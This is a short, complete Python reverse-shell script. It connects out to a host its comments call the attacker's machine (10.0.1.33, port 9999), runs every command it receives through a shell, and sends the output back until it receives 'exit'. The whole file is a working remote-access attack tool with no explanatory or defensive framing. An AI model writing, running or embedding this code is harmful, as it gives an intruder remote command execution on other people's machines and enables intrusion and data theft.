import socket
import subprocess
import os

# Set up the target server and port (attacker's machine)
HOST = '10.0.1.33'  # Attacker's IP address
PORT = 9999  # Port the attacker is listening on

# Function to execute commands on the target machine
def execute_command(command):
    # Execute the command and return the result
    return subprocess.run(command, shell=True, capture_output=True)

# Create a socket object to connect back to the attacker
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Attempt to connect to the attacker's server
try:
    sock.connect((HOST, PORT))
    
    while True:
        # Receive the command from the attacker
        command = sock.recv(1024).decode('utf-8')
        
        if command.lower() == 'exit':
            sock.close()
            break
        
        # Execute the received command and capture the output
        output = execute_command(command)
        
        # Send the output back to the attacker
        sock.sendall(output.stdout + output.stderr)

except Exception as e:
    print(f"Error: {e}")
    sock.close()
